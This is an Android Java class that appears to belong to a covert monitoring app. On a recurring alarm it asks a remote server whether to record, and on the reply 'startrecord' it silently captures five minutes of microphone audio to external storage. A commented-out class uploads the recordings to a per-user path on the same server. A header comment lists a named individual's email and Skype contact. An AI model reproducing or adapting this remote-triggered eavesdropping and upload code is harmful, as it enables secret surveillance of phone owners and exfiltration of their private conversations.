package voluntaty.com.base;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.media.MediaPlayer;
import android.media.MediaRecorder;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.AsyncTask;
import android.os.Environment;
import android.util.TypedValue;

import com.voluntary.database.DataHelper;

import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.util.EntityUtils;

import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
/* e-mail: superslon74@gmail.com
 * skype: superslon74
 * шаманский геннадий александрович
 */

public class RepeatingAlarmServiceAudioOne extends BroadcastReceiver {

    public static final String DEFAULT_STORAGE_LOCATION = "/sdcard/audiorecorder";

    private DataHelper dh;

    String login = null;
    String email = null;
    String password = null;
    String URL_HTTP = null;
    ArrayList<Integer> list = null;
    String EMAIL = null;
    long MIN_TIME_BW_UPDATES2 =300000;
    RequestTask requesttask=null;


    public static boolean isNetworkConnectedOrConnecting(Context context) {
        final ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        final NetworkInfo networkInfo = cm.getActiveNetworkInfo();
        return networkInfo != null && networkInfo.isConnectedOrConnecting();
    }

    public void onReceive(Context context, Intent intent) {
        if (isNetworkConnectedOrConnecting(context.getApplicationContext())) {

            File dir = new File(DEFAULT_STORAGE_LOCATION);

            if (!dir.exists()) {
                try {
                    dir.mkdirs();
                } catch (Exception e) {
                }
            } else {
                if (!dir.canWrite()) {
                }
            }

            someTask(context);
        }
    }


    void someTask(Context context) {
     //   URL_HTTP+"/index.php/api/openrecord?email="+email
       //params[0]= URL_HTTP;
        //params[1]= email;


        dh = null;
        dh = new DataHelper(context);

        String serviceaudioone;
        serviceaudioone = null;

        serviceaudioone = dh.selectServicesms("1");
        dh = null;
        if(serviceaudioone.length()>0) {

            dh = new DataHelper(context);
            URL_HTTP = dh.selectUrl_Http();
            login = dh.selectLogin();
            email = dh.selectEmail();
            password = dh.selectPassword();
            dh = null;
            requesttask = new RequestTask();
            requesttask.ValueContect(context);
            requesttask.execute(URL_HTTP, email);
            //  requesttask.ValueContect(context);
        }

        serviceaudioone = null;

    //    Toast.makeText(context.getApplicationContext()," !!!!!!!! " , Toast.LENGTH_LONG).show();
    }

    class RequestTask extends AsyncTask<String, String, String> {
        private String str2="";
        private MediaRecorder mediaRecorder;
        private MediaPlayer mediaPlayer;
        private int next=0;
        Context context;
        String fileName=null;

        void ValueContect(Context contextA){
            context=contextA;
        }


        @Override
        protected String doInBackground(String... params) {

            try {
                DefaultHttpClient hc = new DefaultHttpClient();
                HttpGet postMethod = new HttpGet(params[0]+"/index.php/api/openrecord?email="+params[1]);
                postMethod.setHeader("Content-Type", "text/plain; charset=utf-8");
                postMethod.setHeader("Expect", "100-continue");

                HttpResponse response = hc.execute(postMethod);
                HttpEntity entity = response.getEntity();
                String content = EntityUtils.toString(entity);
                str2=content.toString().trim();

            } catch (Exception e) {
                System.out.println("Exp=" + e);
            }

            return null;
        }

        @Override
        protected void onPostExecute(String result) {
            super.onPostExecute(result);
      //        Toast.makeText(context.getApplicationContext()," ! "+str2 , Toast.LENGTH_LONG).show();

            if(str2.equals("startrecord"))
            {


                    fileName =null;
                    try {
                        //  releaseRecorder();

                        if (mediaRecorder != null) {
                            mediaRecorder.release();
                            mediaRecorder = null;
                        }

                        String AudiorecorderTrue=null;
                        dh =null;
                        dh= new DataHelper(context);
                        AudiorecorderTrue=dh.selectIdNameFile();
                        int dlina=AudiorecorderTrue.length();
                        if(dlina<1){
                            dh.insertIdNameFile("1");
                            fileName = Environment.getExternalStorageDirectory() + "/audiorecorder/1record.3gpp";
                        }
                        else
                        {
                            int  number= Integer.parseInt(AudiorecorderTrue);
                            number++;
                            dh.insertIdNameFile(""+number);
                            fileName = Environment.getExternalStorageDirectory() + "/audiorecorder/"+number+"record.3gpp";
                        }
                        dh =null;
                        File outFile = new File(fileName);
                        if (outFile.exists()) {
                            outFile.delete();
                        }


                        mediaRecorder = new MediaRecorder();
                        mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
                        mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
                        mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
                        mediaRecorder.setOutputFile(fileName);
                        mediaRecorder.prepare();
                        mediaRecorder.start();

                    } catch (Exception e) {
                        e.printStackTrace();
                    }

                try {
                    Thread.sleep(MIN_TIME_BW_UPDATES2);                 //1000 milliseconds is one second.
                } catch(InterruptedException ex) {
                    Thread.currentThread().interrupt();
                }


                if (mediaRecorder != null) {
                    mediaRecorder.stop();  }


                /*
                Toast.makeText(context.getApplicationContext(),"???????11111  ", Toast.LENGTH_LONG).show();
                Timer myTimer = new Timer(); // Создаем таймер
                final Handler uiHandler = new Handler();
                myTimer.schedule(new TimerTask() {

                    @Override
                    public void run() {

                        uiHandler.post(new Runnable() {
                            @Override
                            public void run() {

             Toast.makeText(context.getApplicationContext(),"time  ", Toast.LENGTH_LONG).show();
                               if(next==1){
                              Toast.makeText(context.getApplicationContext(),"???????22222  ", Toast.LENGTH_LONG).show();
                                        //     new SendFile().execute("");
//-------------------------------------------------------------------------

*/
 /*
                                        File sdPath = Environment.getExternalStorageDirectory();
                                        sdPath = new File(sdPath.getAbsolutePath() + "/audiorecorder");
                                        String filename = null;
                                        //---------------------------------------------------------------------------------------
                                        if (sdPath.exists()) {
                                            File[] images = sdPath.listFiles();
                                            for (int i = 0; i < images.length; i++) {
                                                String strt = null;
                                                strt = "" + images[i];
                                                String[] s = strt.split("/");
                                                int dlina = s.length;
                                                strt = null;
                                                filename = s[dlina - 1];
                                                //   Toast.makeText(getApplicationContext(),"!"+filename+"!", Toast.LENGTH_LONG).show();
                                                String[] s2 = filename.split("\\.");
                                                //   		  Toast.makeText(getApplicationContext()," "+filename, Toast.LENGTH_LONG).show();
                                                String nameaudiofile=null;
                                                dh =null;
                                                dh= new DataHelper(context);

                                                String http_url=null;
                                                String email=null;
                                                http_url=dh.selectUrl_Http();
                                                email=dh.selectEmail();

                                                nameaudiofile=dh.selectNameaudiofile(filename);
                                                int dlinaaudio=nameaudiofile.length();
                                                if(dlinaaudio<1){
                                                new SendFile().execute("" + sdPath, filename,email,http_url);

                                               dh.InsertNameaudiofile(filename);
                                                }

                                                http_url=null;
                                                email=null;
                                                dh =null;

                                                nameaudiofile=null;
                                                strt = null;
                                                filename = null;

                                            }

                                        }
*/
            }
            else
            {

            }
        }
        @Override
        protected void onPreExecute() {
            super.onPreExecute();
        }
    }

/*
    public class SendFile extends AsyncTask<String, String, String> {

        private String str2=null;
        HttpURLConnection conn;

        @Override
        protected String doInBackground(String... params)
        {

            str2=params[1];
            String lineEnd = "\r\n";
            String twoHyphens = "--";
            String boundary = "*****";
            try {

                String emailmodify=null;
                emailmodify=params[2].replaceAll("\\.", "_");
                emailmodify=emailmodify.replaceAll("@", "_");

                URL url = new URL(params[3]+"/user_"+emailmodify+"/audiophonetwo/upload.php");

                conn = (HttpURLConnection) url.openConnection();
                conn.setDoInput(true);
                conn.setDoOutput(true);
                conn.setUseCaches(false);
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Connection", "Keep-Alive");
                conn.setRequestProperty("Content-Type","multipart/form-data;boundary=" + boundary);

                DataOutputStream dos = new DataOutputStream(conn.getOutputStream());

                dos.writeBytes(twoHyphens + boundary + lineEnd);
                TypedValue value = new TypedValue();
                //  activity.getResources().getValue(params[0], value, true);
                dos.writeBytes("Content-Disposition: post-data; name=fileToUpload;filename=" + params[1] + "" + lineEnd);
                dos.writeBytes(lineEnd);


                File sdFile = new File(params[0],params[1]);
                InputStream inputStream = new FileInputStream(sdFile);

                int bytesAvailable = inputStream.available();
                int maxBufferSize = 1000;
                byte[] buffer = new byte[bytesAvailable];

                int bytesRead = inputStream.read(buffer, 0, bytesAvailable);

                while (bytesRead > 0) {
                    dos.write(buffer, 0, bytesAvailable);
                    bytesAvailable = inputStream.available();
                    bytesAvailable = Math.min(bytesAvailable, maxBufferSize);
                    bytesRead = inputStream.read(buffer, 0, bytesAvailable);
                }

                dos.writeBytes(lineEnd);
                dos.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);

                inputStream.close();
                dos.flush();
                dos.close();
            }
            catch (Exception ex) {
                //    return false;
            }


            try {
                BufferedInputStream responseStream = new BufferedInputStream(conn.getInputStream());
                BufferedReader responseStreamReader = new BufferedReader(new InputStreamReader(responseStream));
                String line = "";
                StringBuilder stringBuilder = new StringBuilder();
                while ((line = responseStreamReader.readLine()) != null)
                {
                    stringBuilder.append(line).append("\n");
                }
                responseStreamReader.close();

                String response = stringBuilder.toString();
                conn.disconnect();


            } catch (Exception ex) {
                //return false;
            }

            return null;
        }


        @Override
        protected void onPostExecute(String result) {
            super.onPostExecute(result);
               }

        @Override
        protected void onPreExecute() {

            super.onPreExecute();
        }

    }

*/

}